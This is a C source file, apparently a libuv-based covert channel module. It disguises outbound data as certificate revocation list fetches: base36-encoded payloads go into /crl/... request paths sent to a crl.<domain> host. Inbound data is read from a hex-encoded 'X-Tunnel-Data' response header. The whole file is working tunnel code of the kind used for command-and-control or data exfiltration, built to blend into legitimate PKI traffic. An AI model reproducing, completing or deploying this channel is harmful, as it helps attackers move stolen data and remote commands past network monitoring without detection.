#include "crl_channel.h"
#include "encode.h"
#include "util.h"
#include <string.h>
#include <stdio.h>

/* ------------------------------------------------------------------ */
/* Hex helpers                                                          */
/* ------------------------------------------------------------------ */

static int hex_decode_crl(const char *src, size_t src_len,
                           uint8_t *dst, size_t dst_cap)
{
    size_t i;
    int    hi;
    int    lo;

    if (src_len % 2U != 0U || dst_cap < src_len / 2U) {
        return -1;
    }
    for (i = 0; i < src_len; i += 2U) {
        char c0 = src[i];
        char c1 = src[i + 1U];

        if (c0 >= '0' && c0 <= '9')      { hi = c0 - '0'; }
        else if (c0 >= 'a' && c0 <= 'f') { hi = 10 + (c0 - 'a'); }
        else if (c0 >= 'A' && c0 <= 'F') { hi = 10 + (c0 - 'A'); }
        else { return -1; }

        if (c1 >= '0' && c1 <= '9')      { lo = c1 - '0'; }
        else if (c1 >= 'a' && c1 <= 'f') { lo = 10 + (c1 - 'a'); }
        else if (c1 >= 'A' && c1 <= 'F') { lo = 10 + (c1 - 'A'); }
        else { return -1; }

        dst[i / 2U] = (uint8_t)((hi << 4) | lo);
    }
    return (int)(src_len / 2U);
}

/* ------------------------------------------------------------------ */
/* Internal callbacks                                                   */
/* ------------------------------------------------------------------ */

static void crl_alloc_cb(uv_handle_t *handle, size_t suggested_size,
                          uv_buf_t *buf)
{
    crl_channel_t *ch = (crl_channel_t *)handle->data;
    size_t         avail;

    (void)suggested_size;
    avail = sizeof(ch->recv_buf) - ch->recv_len;
    if (avail == 0) {
        buf->base = NULL;
        buf->len  = 0;
    } else {
        buf->base = (char *)(ch->recv_buf + ch->recv_len);
        buf->len  = avail;
    }
}

static void crl_process_recv(crl_channel_t *ch)
{
    static const char hdr_key[] = "X-Tunnel-Data: ";
    char   *resp  = (char *)ch->recv_buf;
    size_t  rlen  = ch->recv_len;
    char   *found;
    char   *line_end;
    size_t  data_start;
    size_t  data_len;
    uint8_t decoded[2048];
    int     dlen;

    if (rlen < sizeof(ch->recv_buf)) {
        resp[rlen] = '\0';
    } else {
        return;
    }

    found = strstr(resp, hdr_key);
    if (!found) {
        return;
    }

    data_start = (size_t)(found - resp) + sizeof(hdr_key) - 1U;
    line_end   = strstr(resp + data_start, "\r\n");
    if (!line_end) {
        return;
    }

    data_len = (size_t)(line_end - (resp + data_start));
    dlen = hex_decode_crl(resp + data_start, data_len,
                           decoded, sizeof(decoded));
    if (dlen > 0 && ch->on_recv) {
        ch->on_recv(decoded, (size_t)dlen, ch->userdata);
    }

    ch->recv_len = 0;
}

static void crl_read_cb(uv_stream_t *stream, ssize_t nread,
                         const uv_buf_t *buf)
{
    crl_channel_t *ch = (crl_channel_t *)stream->data;

    (void)buf;

    if (nread < 0) {
        ch->connected = 0;
        return;
    }
    if (nread == 0) {
        return;
    }
    ch->recv_len += (size_t)nread;
    crl_process_recv(ch);
}

static void crl_write_cb(uv_write_t *req, int status)
{
    (void)req;
    (void)status;
}

static void crl_connect_cb(uv_connect_t *req, int status)
{
    crl_channel_t *ch = (crl_channel_t *)req->data;

    if (status < 0) {
        ch->connected = 0;
        return;
    }
    ch->connected = 1;
    uv_read_start((uv_stream_t *)&ch->tcp, crl_alloc_cb, crl_read_cb);
}

static void crl_close_cb(uv_handle_t *h)
{
    (void)h;
}

/* ------------------------------------------------------------------ */
/* Public API                                                           */
/* ------------------------------------------------------------------ */

err_t crl_channel_init(crl_channel_t *ch, uv_loop_t *loop,
                       const char *host, uint16_t port,
                       const char *domain)
{
    if (!ch || !loop || !host || !domain) {
        return ERR_INVAL;
    }
    memset(ch, 0, sizeof(*ch));
    ch->loop = loop;
    ch->port = port;
    strncpy(ch->host,   host,   sizeof(ch->host)   - 1);
    strncpy(ch->domain, domain, sizeof(ch->domain) - 1);

    uv_tcp_init(loop, &ch->tcp);
    ch->tcp.data         = ch;
    ch->connect_req.data = ch;
    return ERR_OK;
}

err_t crl_channel_connect(crl_channel_t *ch)
{
    struct sockaddr_in addr;
    int rc;

    if (!ch) {
        return ERR_INVAL;
    }
    rc = uv_ip4_addr(ch->host, ch->port, &addr);
    if (rc != 0) {
        return ERR_IO;
    }
    rc = uv_tcp_connect(&ch->connect_req, &ch->tcp,
                         (const struct sockaddr *)&addr,
                         crl_connect_cb);
    return (rc == 0) ? ERR_OK : ERR_IO;
}

err_t crl_channel_send(crl_channel_t *ch,
                       const uint8_t *data, size_t len)
{
    char     b36[1024];
    int      enc;
    int      n;
    uv_buf_t uvbuf;

    if (!ch || !data || len == 0) {
        return ERR_INVAL;
    }

    if (!ch->connected) {
        crl_channel_connect(ch);
        return ERR_IO;
    }

    enc = encode_data(data, len, b36, sizeof(b36), ENCODE_BASE36);
    if (enc < 0) {
        return ERR_OVERFLOW;
    }
    b36[enc] = '\0';

    ch->req_seq++;
    n = snprintf((char *)ch->send_buf, sizeof(ch->send_buf),
                 "GET /crl/%08x/%s.crl HTTP/1.0\r\n"
                 "Host: crl.%s\r\n"
                 "Accept: application/pkix-crl\r\n"
                 "Connection: keep-alive\r\n\r\n",
                 ch->req_seq, b36, ch->domain);
    if (n < 0 || (size_t)n >= sizeof(ch->send_buf)) {
        return ERR_OVERFLOW;
    }
    ch->send_len = (size_t)n;

    uvbuf = uv_buf_init((char *)ch->send_buf, (unsigned int)ch->send_len);
    uv_write(&ch->write_req, (uv_stream_t *)&ch->tcp, &uvbuf, 1,
             crl_write_cb);
    return ERR_OK;
}

void crl_channel_free(crl_channel_t *ch)
{
    if (!ch) {
        return;
    }
    ch->connected = 0;
    if (!uv_is_closing((uv_handle_t *)&ch->tcp)) {
        uv_close((uv_handle_t *)&ch->tcp, crl_close_cb);
    }
}
